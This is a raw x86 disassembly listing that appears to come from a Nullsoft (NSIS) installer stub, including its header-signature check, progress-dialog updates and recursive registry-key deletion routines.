  402bd5:	eb 7f                	jmp    0x402c56
  402bd7:	6a 05                	push   $0x5
  402bd9:	e8 f2 3e 00 00       	call   0x406ad0
  402bde:	6a 22                	push   $0x22
  402be0:	8b f0                	mov    %eax,%esi
  402be2:	e8 eb 01 00 00       	call   0x402dd2
  402be7:	3b f3                	cmp    %ebx,%esi
  402be9:	74 37                	je     0x402c22
  402beb:	8d 4d a0             	lea    -0x60(%ebp),%ecx
  402bee:	51                   	push   %ecx
  402bef:	50                   	push   %eax
  402bf0:	ff 15 9c 82 40 00    	call   *0x40829c
  402bf6:	85 c0                	test   %eax,%eax
  402bf8:	7c 28                	jl     0x402c22
  402bfa:	8d 45 08             	lea    0x8(%ebp),%eax
  402bfd:	50                   	push   %eax
  402bfe:	53                   	push   %ebx
  402bff:	ff 75 dc             	push   -0x24(%ebp)
  402c02:	8d 45 a0             	lea    -0x60(%ebp),%eax
  402c05:	50                   	push   %eax
  402c06:	ff d6                	call   *%esi
  402c08:	85 c0                	test   %eax,%eax
  402c0a:	7c 16                	jl     0x402c22
  402c0c:	ff 75 08             	push   0x8(%ebp)
  402c0f:	ff 75 f4             	push   -0xc(%ebp)
  402c12:	e8 c5 3a 00 00       	call   0x4066dc
  402c17:	ff 75 08             	push   0x8(%ebp)
  402c1a:	ff 15 a0 82 40 00    	call   *0x4082a0
  402c20:	eb 34                	jmp    0x402c56
  402c22:	8b 45 f4             	mov    -0xc(%ebp),%eax
  402c25:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402c2c:	66 89 18             	mov    %bx,(%eax)
  402c2f:	eb 25                	jmp    0x402c56
  402c31:	8b 0d 50 4f 42 00    	mov    0x424f50,%ecx
  402c37:	53                   	push   %ebx
  402c38:	23 c8                	and    %eax,%ecx
  402c3a:	51                   	push   %ecx
  402c3b:	6a 0b                	push   $0xb
  402c3d:	ff 75 f8             	push   -0x8(%ebp)
  402c40:	ff 15 58 82 40 00    	call   *0x408258
  402c46:	39 5d d0             	cmp    %ebx,-0x30(%ebp)
  402c49:	74 0b                	je     0x402c56
  402c4b:	53                   	push   %ebx
  402c4c:	53                   	push   %ebx
  402c4d:	ff 75 f8             	push   -0x8(%ebp)
  402c50:	ff 15 54 82 40 00    	call   *0x408254
  402c56:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402c59:	01 05 e8 9a 42 00    	add    %eax,0x429ae8
  402c5f:	33 c0                	xor    %eax,%eax
  402c61:	5f                   	pop    %edi
  402c62:	5e                   	pop    %esi
  402c63:	5b                   	pop    %ebx
  402c64:	c9                   	leave
  402c65:	c2 04 00             	ret    $0x4
  402c68:	61                   	popa
  402c69:	2c 40                	sub    $0x40,%al
  402c6b:	00 91 14 40 00 9d    	add    %dl,-0x62ffbfec(%ecx)
  402c71:	14 40                	adc    $0x40,%al
  402c73:	00 b8 14 40 00 cb    	add    %bh,-0x34ffbfec(%eax)
  402c79:	14 40                	adc    $0x40,%al
  402c7b:	00 d7                	add    %dl,%bh
  402c7d:	14 40                	adc    $0x40,%al
  402c7f:	00 f5                	add    %dh,%ch
  402c81:	14 40                	adc    $0x40,%al
  402c83:	00 98 15 40 00 c8    	add    %bl,-0x37ffbfeb(%eax)
  402c89:	15 40 00 e6 15       	adc    $0x15e60040,%eax
  402c8e:	40                   	inc    %eax
  402c8f:	00 96 16 40 00 03    	add    %dl,0x3004016(%esi)
  402c95:	15 40 00 67 15       	adc    $0x15670040,%eax
  402c9a:	40                   	inc    %eax
  402c9b:	00 88 15 40 00 a7    	add    %cl,-0x58ffbfeb(%eax)
  402ca1:	16                   	push   %ss
  402ca2:	40                   	inc    %eax
  402ca3:	00 f8                	add    %bh,%al
  402ca5:	16                   	push   %ss
  402ca6:	40                   	inc    %eax
  402ca7:	00 61 17             	add    %ah,0x17(%ecx)
  402caa:	40                   	inc    %eax
  402cab:	00 88 17 40 00 9b    	add    %cl,-0x64ffbfe9(%eax)
  402cb1:	17                   	pop    %ss
  402cb2:	40                   	inc    %eax
  402cb3:	00 38                	add    %bh,(%eax)
  402cb5:	19 40 00             	sbb    %eax,0x0(%eax)
  402cb8:	3b 19                	cmp    (%ecx),%ebx
  402cba:	40                   	inc    %eax
  402cbb:	00 6d 19             	add    %ch,0x19(%ebp)
  402cbe:	40                   	inc    %eax
  402cbf:	00 82 19 40 00 94    	add    %al,-0x6bffbfe7(%edx)
  402cc5:	19 40 00             	sbb    %eax,0x0(%eax)
  402cc8:	2b 1a                	sub    (%edx),%ebx
  402cca:	40                   	inc    %eax
  402ccb:	00 5c 1a 40          	add    %bl,0x40(%edx,%ebx,1)
  402ccf:	00 9e 1a 40 00 de    	add    %bl,-0x21ffbfe6(%esi)
  402cd5:	1a 40 00             	sbb    0x0(%eax),%al
  402cd8:	a3 1b 40 00 c7       	mov    %eax,0xc700401b
  402cdd:	1b 40 00             	sbb    0x0(%eax),%eax
  402ce0:	6f                   	outsl  %ds:(%esi),(%dx)
  402ce1:	1c 40                	sbb    $0x40,%al
  402ce3:	00 6f 1c             	add    %ch,0x1c(%edi)
  402ce6:	40                   	inc    %eax
  402ce7:	00 43 1d             	add    %al,0x1d(%ebx)
  402cea:	40                   	inc    %eax
  402ceb:	00 64 1d 40          	add    %ah,0x40(%ebp,%ebx,1)
  402cef:	00 89 1d 40 00 ad    	add    %cl,-0x52ffbfe3(%ecx)
  402cf5:	1d 40 00 7a 1e       	sbb    $0x1e7a0040,%eax
  402cfa:	40                   	inc    %eax
  402cfb:	00 0a                	add    %cl,(%edx)
  402cfd:	1f                   	pop    %ds
  402cfe:	40                   	inc    %eax
  402cff:	00 3e                	add    %bh,(%esi)
  402d01:	1f                   	pop    %ds
  402d02:	40                   	inc    %eax
  402d03:	00 d0                	add    %dl,%al
  402d05:	1f                   	pop    %ds
  402d06:	40                   	inc    %eax
  402d07:	00 22                	add    %ah,(%edx)
  402d09:	20 40 00             	and    %al,0x0(%eax)
  402d0c:	56                   	push   %esi
  402d0d:	20 40 00             	and    %al,0x0(%eax)
  402d10:	03 21                	add    (%ecx),%esp
  402d12:	40                   	inc    %eax
  402d13:	00 d6                	add    %dl,%dh
  402d15:	21 40 00             	and    %eax,0x0(%eax)
  402d18:	2b 23                	sub    (%ebx),%esp
  402d1a:	40                   	inc    %eax
  402d1b:	00 af 23 40 00 de    	add    %ch,-0x21ffbfdd(%edi)
  402d21:	23 40 00             	and    0x0(%eax),%eax
  402d24:	20 24 40             	and    %ah,(%eax,%eax,2)
  402d27:	00 60 24             	add    %ah,0x24(%eax)
  402d2a:	40                   	inc    %eax
  402d2b:	00 b6 24 40 00 56    	add    %dh,0x56004024(%esi)
  402d31:	25 40 00 ca 25       	and    $0x25ca0040,%eax
  402d36:	40                   	inc    %eax
  402d37:	00 34 26             	add    %dh,(%esi,%eiz,1)
  402d3a:	40                   	inc    %eax
  402d3b:	00 48 26             	add    %cl,0x26(%eax)
  402d3e:	40                   	inc    %eax
  402d3f:	00 6a 26             	add    %ch,0x26(%edx)
  402d42:	40                   	inc    %eax
  402d43:	00 18                	add    %bl,(%eax)
  402d45:	27                   	daa
  402d46:	40                   	inc    %eax
  402d47:	00 bb 28 40 00 f0    	add    %bh,-0xfffbfd8(%ebx)
  402d4d:	28 40 00             	sub    %al,0x0(%eax)
  402d50:	0a 29                	or     (%ecx),%ch
  402d52:	40                   	inc    %eax
  402d53:	00 37                	add    %dh,(%edi)
  402d55:	29 40 00             	sub    %eax,0x0(%eax)
  402d58:	7c 29                	jl     0x402d83
  402d5a:	40                   	inc    %eax
  402d5b:	00 87 2a 40 00 17    	add    %al,0x1700402a(%edi)
  402d61:	2b 40 00             	sub    0x0(%eax),%eax
  402d64:	85 2b                	test   %ebp,(%ebx)
  402d66:	40                   	inc    %eax
  402d67:	00 56 2c             	add    %dl,0x2c(%esi)
  402d6a:	40                   	inc    %eax
  402d6b:	00 31                	add    %dh,(%ecx)
  402d6d:	2c 40                	sub    $0x40,%al
  402d6f:	00 6a 26             	add    %ch,0x26(%edx)
  402d72:	40                   	inc    %eax
  402d73:	00 18                	add    %bl,(%eax)
  402d75:	27                   	daa
  402d76:	40                   	inc    %eax
  402d77:	00 0e                	add    %cl,(%esi)
  402d79:	1b 40 00             	sbb    0x0(%eax),%eax
  402d7c:	15 1b 40 00 1c       	adc    $0x1c00401b,%eax
  402d81:	1b 40 00             	sbb    0x0(%eax),%eax
  402d84:	21 1b                	and    %ebx,(%ebx)
  402d86:	40                   	inc    %eax
  402d87:	00 31                	add    %dh,(%ecx)
  402d89:	1b 40 00             	sbb    0x0(%eax),%eax
  402d8c:	35 1b 40 00 39       	xor    $0x3900401b,%eax
  402d91:	1b 40 00             	sbb    0x0(%eax),%eax
  402d94:	42                   	inc    %edx
  402d95:	1b 40 00             	sbb    0x0(%eax),%eax
  402d98:	4b                   	dec    %ebx
  402d99:	1b 40 00             	sbb    0x0(%eax),%eax
  402d9c:	58                   	pop    %eax
  402d9d:	1b 40 00             	sbb    0x0(%eax),%eax
  402da0:	68 1b 40 00 86       	push   $0x8600401b
  402da5:	1b 40 00             	sbb    0x0(%eax),%eax
  402da8:	8d 1b                	lea    (%ebx),%ebx
  402daa:	40                   	inc    %eax
  402dab:	00 94 1b 40 00 8b 44 	add    %dl,0x448b0040(%ebx,%ebx,1)
  402db2:	24 04                	and    $0x4,%al
  402db4:	8b 0d 54 ce 40 00    	mov    0x40ce54,%ecx
  402dba:	56                   	push   %esi
  402dbb:	ff 34 81             	push   (%ecx,%eax,4)
  402dbe:	6a 00                	push   $0x0
  402dc0:	e8 54 39 00 00       	call   0x406719
  402dc5:	8b f0                	mov    %eax,%esi
  402dc7:	56                   	push   %esi
  402dc8:	e8 6f 38 00 00       	call   0x40663c
  402dcd:	0f b7 16             	movzwl (%esi),%edx
  402dd0:	5e                   	pop    %esi
  402dd1:	c3                   	ret
  402dd2:	56                   	push   %esi
  402dd3:	8b 74 24 08          	mov    0x8(%esp),%esi
  402dd7:	85 f6                	test   %esi,%esi
  402dd9:	57                   	push   %edi
  402dda:	8b c6                	mov    %esi,%eax
  402ddc:	7d 02                	jge    0x402de0
  402dde:	f7 d8                	neg    %eax
  402de0:	8b 15 54 ce 40 00    	mov    0x40ce54,%edx
  402de6:	8b c8                	mov    %eax,%ecx
  402de8:	83 e1 0f             	and    $0xf,%ecx
  402deb:	c1 f8 04             	sar    $0x4,%eax
  402dee:	ff 34 8a             	push   (%edx,%ecx,4)
  402df1:	c1 e0 0b             	shl    $0xb,%eax
  402df4:	05 f8 a5 40 00       	add    $0x40a5f8,%eax
  402df9:	50                   	push   %eax
  402dfa:	e8 1a 39 00 00       	call   0x406719
  402dff:	85 f6                	test   %esi,%esi
  402e01:	8b f8                	mov    %eax,%edi
  402e03:	7d 06                	jge    0x402e0b
  402e05:	57                   	push   %edi
  402e06:	e8 7f 3b 00 00       	call   0x40698a
  402e0b:	8b c7                	mov    %edi,%eax
  402e0d:	5f                   	pop    %edi
  402e0e:	5e                   	pop    %esi
  402e0f:	c2 04 00             	ret    $0x4
  402e12:	55                   	push   %ebp
  402e13:	8b ec                	mov    %esp,%ebp
  402e15:	8d 45 08             	lea    0x8(%ebp),%eax
  402e18:	50                   	push   %eax
  402e19:	8b 45 08             	mov    0x8(%ebp),%eax
  402e1c:	0d 20 00 10 00       	or     $0x100020,%eax
  402e21:	50                   	push   %eax
  402e22:	6a 22                	push   $0x22
  402e24:	e8 a9 ff ff ff       	call   0x402dd2
  402e29:	50                   	push   %eax
  402e2a:	a1 54 ce 40 00       	mov    0x40ce54,%eax
  402e2f:	ff 70 04             	push   0x4(%eax)
  402e32:	e8 13 00 00 00       	call   0x402e4a
  402e37:	50                   	push   %eax
  402e38:	e8 0c 37 00 00       	call   0x406549
  402e3d:	f7 d8                	neg    %eax
  402e3f:	1b c0                	sbb    %eax,%eax
  402e41:	f7 d0                	not    %eax
  402e43:	23 45 08             	and    0x8(%ebp),%eax
  402e46:	5d                   	pop    %ebp
  402e47:	c2 04 00             	ret    $0x4
  402e4a:	8b 44 24 04          	mov    0x4(%esp),%eax
  402e4e:	85 c0                	test   %eax,%eax
  402e50:	7c 0d                	jl     0x402e5f
  402e52:	8b 0d e4 9a 42 00    	mov    0x429ae4,%ecx
  402e58:	8d 84 01 01 00 00 80 	lea    -0x7fffffff(%ecx,%eax,1),%eax
  402e5f:	c2 04 00             	ret    $0x4
  402e62:	55                   	push   %ebp
  402e63:	8b ec                	mov    %esp,%ebp
  402e65:	8d 45 10             	lea    0x10(%ebp),%eax
  402e68:	50                   	push   %eax
  402e69:	8b 45 10             	mov    0x10(%ebp),%eax
  402e6c:	0d 20 00 10 00       	or     $0x100020,%eax
  402e71:	50                   	push   %eax
  402e72:	ff 75 0c             	push   0xc(%ebp)
  402e75:	ff 75 08             	push   0x8(%ebp)
  402e78:	e8 cd ff ff ff       	call   0x402e4a
  402e7d:	50                   	push   %eax
  402e7e:	e8 f4 36 00 00       	call   0x406577
  402e83:	f7 d8                	neg    %eax
  402e85:	1b c0                	sbb    %eax,%eax
  402e87:	f7 d0                	not    %eax
  402e89:	23 45 10             	and    0x10(%ebp),%eax
  402e8c:	5d                   	pop    %ebp
  402e8d:	c2 0c 00             	ret    $0xc
  402e90:	55                   	push   %ebp
  402e91:	8b ec                	mov    %esp,%ebp
  402e93:	56                   	push   %esi
  402e94:	8b 75 0c             	mov    0xc(%ebp),%esi
  402e97:	66 83 3e 00          	cmpw   $0x0,(%esi)
  402e9b:	75 07                	jne    0x402ea4
  402e9d:	b8 eb 03 00 00       	mov    $0x3eb,%eax
  402ea2:	eb 2c                	jmp    0x402ed0
  402ea4:	81 4d 10 20 00 10 00 	orl    $0x100020,0x10(%ebp)
  402eab:	8d 45 10             	lea    0x10(%ebp),%eax
  402eae:	50                   	push   %eax
  402eaf:	ff 75 08             	push   0x8(%ebp)
  402eb2:	e8 93 ff ff ff       	call   0x402e4a
  402eb7:	50                   	push   %eax
  402eb8:	e8 0b 36 00 00       	call   0x4064c8
  402ebd:	85 c0                	test   %eax,%eax
  402ebf:	74 0c                	je     0x402ecd
  402ec1:	ff 75 10             	push   0x10(%ebp)
  402ec4:	56                   	push   %esi
  402ec5:	50                   	push   %eax
  402ec6:	e8 0a 00 00 00       	call   0x402ed5
  402ecb:	eb 03                	jmp    0x402ed0
  402ecd:	6a 06                	push   $0x6
  402ecf:	58                   	pop    %eax
  402ed0:	5e                   	pop    %esi
  402ed1:	5d                   	pop    %ebp
  402ed2:	c2 0c 00             	ret    $0xc
  402ed5:	55                   	push   %ebp
  402ed6:	8b ec                	mov    %esp,%ebp
  402ed8:	81 ec 14 02 00 00    	sub    $0x214,%esp
  402ede:	53                   	push   %ebx
  402edf:	56                   	push   %esi
  402ee0:	8b 75 10             	mov    0x10(%ebp),%esi
  402ee3:	57                   	push   %edi
  402ee4:	8b fe                	mov    %esi,%edi
  402ee6:	8d 45 fc             	lea    -0x4(%ebp),%eax
  402ee9:	81 e6 00 03 00 00    	and    $0x300,%esi
  402eef:	50                   	push   %eax
  402ef0:	8b c6                	mov    %esi,%eax
  402ef2:	83 e7 01             	and    $0x1,%edi
  402ef5:	0c 09                	or     $0x9,%al
  402ef7:	50                   	push   %eax
  402ef8:	ff 75 0c             	push   0xc(%ebp)
  402efb:	ff 75 08             	push   0x8(%ebp)
  402efe:	e8 46 36 00 00       	call   0x406549
  402f03:	33 db                	xor    %ebx,%ebx
  402f05:	3b c3                	cmp    %ebx,%eax
  402f07:	0f 85 ab 00 00 00    	jne    0x402fb8
  402f0d:	f6 45 10 02          	testb  $0x2,0x10(%ebp)
  402f11:	74 23                	je     0x402f36
  402f13:	53                   	push   %ebx
  402f14:	53                   	push   %ebx
  402f15:	53                   	push   %ebx
  402f16:	8d 45 f8             	lea    -0x8(%ebp),%eax
  402f19:	53                   	push   %ebx
  402f1a:	50                   	push   %eax
  402f1b:	8d 85 ec fd ff ff    	lea    -0x214(%ebp),%eax
  402f21:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  402f24:	50                   	push   %eax
  402f25:	53                   	push   %ebx
  402f26:	ff 75 fc             	push   -0x4(%ebp)
  402f29:	ff 15 00 80 40 00    	call   *0x408000
  402f2f:	3d 03 01 00 00       	cmp    $0x103,%eax
  402f34:	75 67                	jne    0x402f9d
  402f36:	8d 85 ec fd ff ff    	lea    -0x214(%ebp),%eax
  402f3c:	68 05 01 00 00       	push   $0x105
  402f41:	50                   	push   %eax
  402f42:	53                   	push   %ebx
  402f43:	8b 1d 04 80 40 00    	mov    0x408004,%ebx
  402f49:	eb 27                	jmp    0x402f72
  402f4b:	85 ff                	test   %edi,%edi
  402f4d:	75 4e                	jne    0x402f9d
  402f4f:	ff 75 10             	push   0x10(%ebp)
  402f52:	8d 85 ec fd ff ff    	lea    -0x214(%ebp),%eax
  402f58:	50                   	push   %eax
  402f59:	ff 75 fc             	push   -0x4(%ebp)
  402f5c:	e8 74 ff ff ff       	call   0x402ed5
  402f61:	85 c0                	test   %eax,%eax
  402f63:	75 16                	jne    0x402f7b
  402f65:	8d 85 ec fd ff ff    	lea    -0x214(%ebp),%eax
  402f6b:	68 05 01 00 00       	push   $0x105
  402f70:	50                   	push   %eax
  402f71:	57                   	push   %edi
  402f72:	ff 75 fc             	push   -0x4(%ebp)
  402f75:	ff d3                	call   *%ebx
  402f77:	85 c0                	test   %eax,%eax
  402f79:	74 d0                	je     0x402f4b
  402f7b:	ff 75 fc             	push   -0x4(%ebp)
  402f7e:	ff 15 10 80 40 00    	call   *0x408010
  402f84:	6a 03                	push   $0x3
  402f86:	e8 45 3b 00 00       	call   0x406ad0
  402f8b:	85 c0                	test   %eax,%eax
  402f8d:	75 1e                	jne    0x402fad
  402f8f:	ff 75 0c             	push   0xc(%ebp)
  402f92:	ff 75 08             	push   0x8(%ebp)
  402f95:	ff 15 18 80 40 00    	call   *0x408018
  402f9b:	eb 1b                	jmp    0x402fb8
  402f9d:	ff 75 fc             	push   -0x4(%ebp)
  402fa0:	ff 15 10 80 40 00    	call   *0x408010
  402fa6:	b8 eb 03 00 00       	mov    $0x3eb,%eax
  402fab:	eb 0b                	jmp    0x402fb8
  402fad:	6a 00                	push   $0x0
  402faf:	56                   	push   %esi
  402fb0:	ff 75 0c             	push   0xc(%ebp)
  402fb3:	ff 75 08             	push   0x8(%ebp)
  402fb6:	ff d0                	call   *%eax
  402fb8:	5f                   	pop    %edi
  402fb9:	5e                   	pop    %esi
  402fba:	5b                   	pop    %ebx
  402fbb:	c9                   	leave
  402fbc:	c2 0c 00             	ret    $0xc
  402fbf:	55                   	push   %ebp
  402fc0:	8b ec                	mov    %esp,%ebp
  402fc2:	81 ec 80 00 00 00    	sub    $0x80,%esp
  402fc8:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  402fcf:	75 19                	jne    0x402fea
  402fd1:	6a 00                	push   $0x0
  402fd3:	68 fa 00 00 00       	push   $0xfa
  402fd8:	6a 01                	push   $0x1
  402fda:	ff 75 08             	push   0x8(%ebp)
  402fdd:	ff 15 18 82 40 00    	call   *0x408218
  402fe3:	c7 45 0c 13 01 00 00 	movl   $0x113,0xc(%ebp)
  402fea:	81 7d 0c 13 01 00 00 	cmpl   $0x113,0xc(%ebp)
  402ff1:	75 45                	jne    0x403038
  402ff3:	e8 46 00 00 00       	call   0x40303e
  402ff8:	83 3d 70 9a 42 00 00 	cmpl   $0x0,0x429a70
  402fff:	b9 54 a0 40 00       	mov    $0x40a054,%ecx
  403004:	75 05                	jne    0x40300b
  403006:	b9 20 a0 40 00       	mov    $0x40a020,%ecx
  40300b:	50                   	push   %eax
  40300c:	8d 45 80             	lea    -0x80(%ebp),%eax
  40300f:	51                   	push   %ecx
  403010:	50                   	push   %eax
  403011:	ff 15 2c 82 40 00    	call   *0x40822c
  403017:	83 c4 0c             	add    $0xc,%esp
  40301a:	8d 45 80             	lea    -0x80(%ebp),%eax
  40301d:	50                   	push   %eax
  40301e:	ff 75 08             	push   0x8(%ebp)
  403021:	ff 15 1c 82 40 00    	call   *0x40821c
  403027:	8d 45 80             	lea    -0x80(%ebp),%eax
  40302a:	50                   	push   %eax
  40302b:	68 06 04 00 00       	push   $0x406
  403030:	ff 75 08             	push   0x8(%ebp)
  403033:	e8 e2 2c 00 00       	call   0x405d1a
  403038:	33 c0                	xor    %eax,%eax
  40303a:	c9                   	leave
  40303b:	c2 10 00             	ret    $0x10
  40303e:	8b 0d f0 8e 41 00    	mov    0x418ef0,%ecx
  403044:	a1 04 0f 42 00       	mov    0x420f04,%eax
  403049:	3b c8                	cmp    %eax,%ecx
  40304b:	72 02                	jb     0x40304f
  40304d:	8b c8                	mov    %eax,%ecx
  40304f:	50                   	push   %eax
  403050:	6a 64                	push   $0x64
  403052:	51                   	push   %ecx
  403053:	ff 15 48 81 40 00    	call   *0x408148
  403059:	c3                   	ret
  40305a:	55                   	push   %ebp
  40305b:	8b ec                	mov    %esp,%ebp
  40305d:	81 ec 80 00 00 00    	sub    $0x80,%esp
  403063:	56                   	push   %esi
  403064:	33 f6                	xor    %esi,%esi
  403066:	39 75 08             	cmp    %esi,0x8(%ebp)
  403069:	74 18                	je     0x403083
  40306b:	a1 00 0f 42 00       	mov    0x420f00,%eax
  403070:	3b c6                	cmp    %esi,%eax
  403072:	74 07                	je     0x40307b
  403074:	50                   	push   %eax
  403075:	ff 15 10 82 40 00    	call   *0x408210
  40307b:	89 35 00 0f 42 00    	mov    %esi,0x420f00
  403081:	eb 76                	jmp    0x4030f9
  403083:	39 35 00 0f 42 00    	cmp    %esi,0x420f00
  403089:	74 08                	je     0x403093
  40308b:	56                   	push   %esi
  40308c:	e8 7b 3a 00 00       	call   0x406b0c
  403091:	eb 66                	jmp    0x4030f9
  403093:	ff 15 d0 80 40 00    	call   *0x4080d0
  403099:	3b 05 6c 9a 42 00    	cmp    0x429a6c,%eax
  40309f:	76 58                	jbe    0x4030f9
  4030a1:	39 35 68 9a 42 00    	cmp    %esi,0x429a68
  4030a7:	74 2d                	je     0x4030d6
  4030a9:	f6 05 14 9b 42 00 01 	testb  $0x1,0x429b14
  4030b0:	74 47                	je     0x4030f9
  4030b2:	e8 87 ff ff ff       	call   0x40303e
  4030b7:	50                   	push   %eax
  4030b8:	8d 45 80             	lea    -0x80(%ebp),%eax
  4030bb:	68 80 a0 40 00       	push   $0x40a080
  4030c0:	50                   	push   %eax
  4030c1:	ff 15 2c 82 40 00    	call   *0x40822c
  4030c7:	83 c4 0c             	add    $0xc,%esp
  4030ca:	8d 45 80             	lea    -0x80(%ebp),%eax
  4030cd:	50                   	push   %eax
  4030ce:	56                   	push   %esi
  4030cf:	e8 8d 26 00 00       	call   0x405761
  4030d4:	eb 23                	jmp    0x4030f9
  4030d6:	56                   	push   %esi
  4030d7:	68 bf 2f 40 00       	push   $0x402fbf
  4030dc:	56                   	push   %esi
  4030dd:	6a 6f                	push   $0x6f
  4030df:	ff 35 60 9a 42 00    	push   0x429a60
  4030e5:	ff 15 14 82 40 00    	call   *0x408214
  4030eb:	6a 05                	push   $0x5
  4030ed:	50                   	push   %eax
  4030ee:	a3 00 0f 42 00       	mov    %eax,0x420f00
  4030f3:	ff 15 28 82 40 00    	call   *0x408228
  4030f9:	5e                   	pop    %esi
  4030fa:	c9                   	leave
  4030fb:	c3                   	ret
  4030fc:	55                   	push   %ebp
  4030fd:	8b ec                	mov    %esp,%ebp
  4030ff:	81 ec 30 02 00 00    	sub    $0x230,%esp
  403105:	53                   	push   %ebx
  403106:	56                   	push   %esi
  403107:	57                   	push   %edi
  403108:	33 ff                	xor    %edi,%edi
  40310a:	89 7d fc             	mov    %edi,-0x4(%ebp)
  40310d:	89 7d f4             	mov    %edi,-0xc(%ebp)
  403110:	89 7d f8             	mov    %edi,-0x8(%ebp)
  403113:	ff 15 d0 80 40 00    	call   *0x4080d0
  403119:	be 00 78 43 00       	mov    $0x437800,%esi
  40311e:	68 00 04 00 00       	push   $0x400
  403123:	05 e8 03 00 00       	add    $0x3e8,%eax
  403128:	56                   	push   %esi
  403129:	57                   	push   %edi
  40312a:	a3 6c 9a 42 00       	mov    %eax,0x429a6c
  40312f:	ff 15 c0 80 40 00    	call   *0x4080c0
  403135:	bb 00 00 00 80       	mov    $0x80000000,%ebx
  40313a:	eb 27                	jmp    0x403163
  40313c:	ff 15 c4 80 40 00    	call   *0x4080c4
  403142:	83 f8 20             	cmp    $0x20,%eax
  403145:	0f 85 1a 01 00 00    	jne    0x403265
  40314b:	ff 45 f8             	incl   -0x8(%ebp)
  40314e:	83 7d f8 06          	cmpl   $0x6,-0x8(%ebp)
  403152:	0f 87 0d 01 00 00    	ja     0x403265
  403158:	68 fa 00 00 00       	push   $0xfa
  40315d:	ff 15 d4 80 40 00    	call   *0x4080d4
  403163:	6a 03                	push   $0x3
  403165:	53                   	push   %ebx
  403166:	56                   	push   %esi
  403167:	e8 60 30 00 00       	call   0x4061cc
  40316c:	8b f8                	mov    %eax,%edi
  40316e:	83 ff ff             	cmp    $0xffffffff,%edi
  403171:	89 3d 18 a0 40 00    	mov    %edi,0x40a018
  403177:	74 c3                	je     0x40313c
  403179:	56                   	push   %esi
  40317a:	be 00 58 43 00       	mov    $0x435800,%esi
  40317f:	56                   	push   %esi
  403180:	e8 57 35 00 00       	call   0x4066dc
  403185:	56                   	push   %esi
  403186:	e8 6c 2e 00 00       	call   0x405ff7
  40318b:	50                   	push   %eax
  40318c:	68 00 80 43 00       	push   $0x438000
  403191:	e8 46 35 00 00       	call   0x4066dc
  403196:	33 db                	xor    %ebx,%ebx
  403198:	53                   	push   %ebx
  403199:	57                   	push   %edi
  40319a:	ff 15 c8 80 40 00    	call   *0x4080c8
  4031a0:	3b c3                	cmp    %ebx,%eax
  4031a2:	a3 04 0f 42 00       	mov    %eax,0x420f04
  4031a7:	8b f0                	mov    %eax,%esi
  4031a9:	0f 86 f3 00 00 00    	jbe    0x4032a2
  4031af:	bb f8 8e 41 00       	mov    $0x418ef8,%ebx
  4031b4:	a1 74 9a 42 00       	mov    0x429a74,%eax
  4031b9:	8b fe                	mov    %esi,%edi
  4031bb:	f7 d8                	neg    %eax
  4031bd:	1b c0                	sbb    %eax,%eax
  4031bf:	25 00 7e 00 00       	and    $0x7e00,%eax
  4031c4:	05 00 02 00 00       	add    $0x200,%eax
  4031c9:	3b f0                	cmp    %eax,%esi
  4031cb:	72 02                	jb     0x4031cf
  4031cd:	8b f8                	mov    %eax,%edi
  4031cf:	57                   	push   %edi
  4031d0:	53                   	push   %ebx
  4031d1:	e8 6b 04 00 00       	call   0x403641
  4031d6:	85 c0                	test   %eax,%eax
  4031d8:	0f 84 5f 01 00 00    	je     0x40333d
  4031de:	83 3d 74 9a 42 00 00 	cmpl   $0x0,0x429a74
  4031e5:	0f 85 84 00 00 00    	jne    0x40326f
  4031eb:	6a 1c                	push   $0x1c
  4031ed:	8d 45 d8             	lea    -0x28(%ebp),%eax
  4031f0:	53                   	push   %ebx
  4031f1:	50                   	push   %eax
  4031f2:	e8 90 2f 00 00       	call   0x406187
  4031f7:	8b 45 d8             	mov    -0x28(%ebp),%eax
  4031fa:	a9 f0 ff ff ff       	test   $0xfffffff0,%eax
  4031ff:	75 7c                	jne    0x40327d
  403201:	81 7d dc ef be ad de 	cmpl   $0xdeadbeef,-0x24(%ebp)
  403208:	75 73                	jne    0x40327d
  40320a:	81 7d e8 49 6e 73 74 	cmpl   $0x74736e49,-0x18(%ebp)
  403211:	75 6a                	jne    0x40327d
  403213:	81 7d e4 73 6f 66 74 	cmpl   $0x74666f73,-0x1c(%ebp)
  40321a:	75 61                	jne    0x40327d
  40321c:	81 7d e0 4e 75 6c 6c 	cmpl   $0x6c6c754e,-0x20(%ebp)
  403223:	75 58                	jne    0x40327d
  403225:	09 45 08             	or     %eax,0x8(%ebp)
  403228:	8b 45 08             	mov    0x8(%ebp),%eax
  40322b:	8b 0d f0 8e 41 00    	mov    0x418ef0,%ecx
  403231:	83 e0 02             	and    $0x2,%eax
  403234:	09 05 00 9b 42 00    	or     %eax,0x429b00
  40323a:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40323d:	3b c6                	cmp    %esi,%eax
  40323f:	89 0d 74 9a 42 00    	mov    %ecx,0x429a74
  403245:	0f 87 36 01 00 00    	ja     0x403381
  40324b:	f6 45 08 08          	testb  $0x8,0x8(%ebp)
  40324f:	75 06                	jne    0x403257
  403251:	f6 45 08 04          	testb  $0x4,0x8(%ebp)
  403255:	75 49                	jne    0x4032a0
  403257:	ff 45 f4             	incl   -0xc(%ebp)
  40325a:	8d 70 fc             	lea    -0x4(%eax),%esi
  40325d:	3b fe                	cmp    %esi,%edi
  40325f:	76 1c                	jbe    0x40327d
  403261:	8b fe                	mov    %esi,%edi
  403263:	eb 18                	jmp    0x40327d
  403265:	b8 b8 a2 40 00       	mov    $0x40a2b8,%eax
  40326a:	e9 5a 01 00 00       	jmp    0x4033c9
  40326f:	f6 45 08 02          	testb  $0x2,0x8(%ebp)
  403273:	75 08                	jne    0x40327d
  403275:	6a 00                	push   $0x0
  403277:	e8 de fd ff ff       	call   0x40305a
  40327c:	59                   	pop    %ecx
  40327d:	3b 35 04 0f 42 00    	cmp    0x420f04,%esi
  403283:	73 0d                	jae    0x403292
  403285:	57                   	push   %edi
  403286:	53                   	push   %ebx
  403287:	ff 75 fc             	push   -0x4(%ebp)
  40328a:	e8 2e 39 00 00       	call   0x406bbd
  40328f:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403292:	01 3d f0 8e 41 00    	add    %edi,0x418ef0
  403298:	2b f7                	sub    %edi,%esi
  40329a:	0f 85 14 ff ff ff    	jne    0x4031b4
  4032a0:	33 db                	xor    %ebx,%ebx
